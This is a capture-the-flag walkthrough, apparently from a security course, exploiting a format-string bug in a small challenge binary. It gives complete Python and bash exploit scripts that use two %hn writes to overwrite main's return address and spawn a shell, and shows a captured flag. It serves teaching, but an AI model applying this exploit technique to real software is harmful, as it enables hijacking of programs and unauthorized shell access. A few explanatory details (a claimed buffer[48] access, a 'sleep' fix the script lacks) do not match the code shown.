# formatstring4 Walkthrough - Understanding the Exploitation Process

## Challenge Overview

- **Binary**: `jump`
- **Source**: `pwn4.c`
- **Vulnerability**: Format string in `printf(buffer)` where user controls input
- **Goal**: Redirect main's return address to `jump()` function to spawn bash
- **Constraint**: Exactly 31 bytes for exploit payload (fgets limit)
- **Advantage**: Binary leaks both `jump()` address and `&buffer` for free

### The Vulnerable Code

```c
void jump() {
  printf("fff");
  system("/bin/bash");
}

int main() {
  char buffer[32];
  printf("Let me jump to the function %x, %x. Give me the code for teleport.\n", jump, &buffer);
  fgets(buffer, 32, stdin);  // 31 bytes max
  printf(buffer);            // FORMAT STRING BUG
  return 0;
}
```

---

## The Exploitation Steps (With Shell Math & Python for Binary)

### Step 1: Get the leaked addresses

Run the binary and capture the output:

```bash
echo "dummy" | ./jump
```

Output:
```
Let me jump to the function 80491a6, ff89666c. Give me the code for teleport.
```

Extract:
- `jump()` address: `0x80491a6`
- `buffer` address: `0xff89666c`

**Why this matters:** The binary gives us the target function and the location of our input buffer on the stack. This is crucial for calculating where to write.

---

### Step 2: Understand where the return address lives

The buffer is 32 bytes on the stack. When `main()` returns, it pops the saved return address.

By accessing `buffer[48]` in the source code, we know:
- **Return address = buffer_addr + 48**

Example calculation:
```bash
buffer_addr = 0xff89666c
offset = 48 decimal = 0x30 hex
ret_addr = 0xff89666c + 0x30 = 0xff89669c
```

**Why:** When we printf with `%hn`, it writes to an address we specify. By overwriting the return address, we hijack code execution.

---

### Step 3: The two-halfword technique (Why 31 bytes forces this)

We need to write `0x80491a6` into `ret_addr`, but we only have 31 bytes total. A normal 4-byte write won't fit.

**Solution:** Split into two 16-bit writes
- Write HIGH 16 bits (0x0804) to `ret_addr + 2`
- Write LOW 16 bits (0x91a6) to `ret_addr`

**Halfword calculation:**
```bash
0x80491a6 >> 16 = 0x0804 = 2052 decimal  (HIGH)
0x80491a6 & 0xFFFF = 0x91a6 = 37286 decimal  (LOW)
```

---

### Step 4: Calculate the padding values

When printf processes `%Nc`, it prints N characters. The `%hn` primitive then writes the **total character count** to memory.

**First write** (write HIGH = 2052 to ret_addr+2):
- Already printed: 8 bytes (two 4-byte pointers in header)
- Want to write: 2052
- Padding: `2052 - 8 = 2044` format string: `%2044c%1$hn`

**Second write** (write LOW = 37286 to ret_addr):
- After first write, total: 2052
- Want to write: 37286
- Padding: `37286 - 2052 = 35234` format string: `%35234c%2$hn`

---

### Step 5-7: Building and sending the payload

Here's where **binary payload construction** gets complex in pure shell. The cleanest approach uses Python:

```python
import subprocess, struct, re

# Step 1: Leak addresses and do hex calculations (as above)
proc = subprocess.Popen(["./jump"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out, _ = proc.communicate(input=b"dummy\n", timeout=2)

m = re.search(r'function ([0-9a-f]+), ([0-9a-f]+)', out.decode('latin1', errors='ignore'))
jump_addr = int(m.group(1), 16)       # 0x80491a6
buffer_addr = int(m.group(2), 16)     # e.g., 0xff89666c

# Step 2: Calculate target addresses
ret_addr = buffer_addr + 48
high = (jump_addr >> 16) & 0xFFFF     # 2052
low = jump_addr & 0xFFFF              # 37286

# Step 3: Build 8-byte pointer header (LITTLE-ENDIAN!)
addr1 = ret_addr + 2                  # where to write HIGH
addr2 = ret_addr                      # where to write LOW
header = struct.pack('<II', addr1, addr2)  # 8 bytes

# Step 4: Build format string (23 bytes)
pad1 = high - 8                       # 2044
pad2 = low - high                     # 35234
fmt = f"%{pad1}c%1$hn%{pad2}c%2$hn".encode()

# Step 5: Complete payload (exactly 31 bytes)
payload = header + fmt

# Step 6: Send and exploit
proc2 = subprocess.Popen(["./jump"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
result, _ = proc2.communicate(input=payload + b"\ncat flag.txt\nexit\n", timeout=3)
print(result.decode('latin1', errors='ignore'))
```

**The key insight:** The calculations (steps 1-4) are pure math and don't care if you do them in shell or Python. But the binary payload assembly (step 5) is where little-endian byte ordering makes shell painful.

---

## Understanding Little-Endian in the Payload

Remember: our addresses must be in **little-endian** format in the binary payload.

Example:
- Address `0xff89669e` becomes `\x9e\x66\x89\xff` in the payload (least significant byte first)
- This is what `struct.pack('<II', addr1, addr2)` does automatically

---

## Complete Working Script

Save as `exploit.sh`:

```bash
#!/bin/bash
cd /home/jbenjam7/cs466/ctf/formatstring4

python3 << 'EXPLOIT_EOF'
import subprocess, struct, re

PROMPT_TEXT = "Give me the code for teleport."

# Step 1: Start process and read banner byte-by-byte
proc = subprocess.Popen(["./jump"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = b""
while PROMPT_TEXT.encode() not in out:
    chunk = proc.stdout.read(1)
    if not chunk:
        break
    out += chunk

banner = out.decode('latin1', errors='ignore')
print("[*] Banner received")

# Parse leaked addresses
m = re.search(r'function ([0-9a-f]+), ([0-9a-f]+)', banner)
jump_addr = int(m.group(1), 16)
buffer_addr = int(m.group(2), 16)

print(f"[*] Leaked jump() address: 0x{jump_addr:x}")
print(f"[*] Leaked buffer address: 0x{buffer_addr:x}")

# Calculate return address
ret_addr = buffer_addr + 48
print(f"[*] Return address: 0x{ret_addr:x}")

# Split address (exactly as exploit.py does)
low = jump_addr & 0xFFFF
high = (jump_addr >> 16) & 0xFFFF

print(f"[*] HIGH: 0x{high:04x} ({high})  LOW: 0x{low:04x} ({low})")

# Build payload
addr1 = ret_addr + 2  # write HIGH here
addr2 = ret_addr      # write LOW here

already_printed = 8
w1 = (high - already_printed) % 0x10000
w2 = (low - high) % 0x10000

fmt = f"%{w1}c%1$hn%{w2}c%2$hn".encode("ascii")
payload = struct.pack("<I", addr1) + struct.pack("<I", addr2) + fmt

print(f"[*] Payload length: {len(payload)} bytes")
assert len(payload) == 31

# Step 2: Send exploit payload and commands
print("[*] Sending exploit...")
proc.stdin.write(payload + b"cat flag.txt\nexit\n")
proc.stdin.flush()
proc.stdin.close()  # CRITICAL: Signal EOF so bash processes commands and exits

# Step 3: Read remaining output
rest = proc.stdout.read().decode('latin1', errors='ignore')
print(rest)
EXPLOIT_EOF
```

Run:
```bash
chmod +x exploit.sh
./exploit.sh
```

**Key difference from naive version:** This script:
1. Reads the banner **byte-by-byte** to wait for the prompt
2. **Closes stdin** after sending payload to signal EOF to bash
3. This allows bash to process commands and exit cleanly

Expected output:
```
[*] Banner received
[*] Leaked jump() address: 0x80491a6
[*] Leaked buffer address: 0xffxxxxxx
[*] Return address: 0xffxxxxxx
[*] HIGH: 0x0804 (2052)  LOW: 0x91a6 (37286)
[*] Payload length: 31 bytes
[*] Sending exploit...
fff
cosc466-flag-{u3VyuWnP8GU3cHbnrCFu}
```

The `fff` proves we redirected to `jump()`!

---

## Key Concepts to Understand

1. **Two-halfword write**: Overcomes 31-byte constraint by splitting 32-bit address into two 16-bit writes
2. **Character count = write value**: printf's character accumulation becomes our "write value" via `%hn`
3. **Format string positioning**: `%1$` references pointer 1, `%2$` references pointer 2 (placed at payload start)
4. **Little-endian matters**: x86 stores least significant byte first in memory
5. **Payload structure**: [8 bytes addresses] + [23 bytes format string] = exactly 31 bytes

---

## Why Shell + Python Hybrid?

- **Shell excels at:** Arithmetic (hex calculations, bit shifting), regex parsing, commands
- **Shell struggles with:** Binary byte construction, proper escaping of special characters
- **Python excels at:** Binary operations (`struct.pack`), reliable byte handling, cleaner logic
- **Result:** Use shell for conceptual steps, Python for messy binary work = practical exploitation

---

## Troubleshooting

| Issue | Cause |
|-------|-------|
| Wrong payload length | Double-check padding numbers - off-by-one errors are common |
| No "fff" in output | Return address wasn't written - verify padding math or address format |
| Commands don't execute | Bash started but needs more time - increase sleep between commands |
| Garbage output | Payload sent before binary ready - ensure stdin/stdout buffering correct |
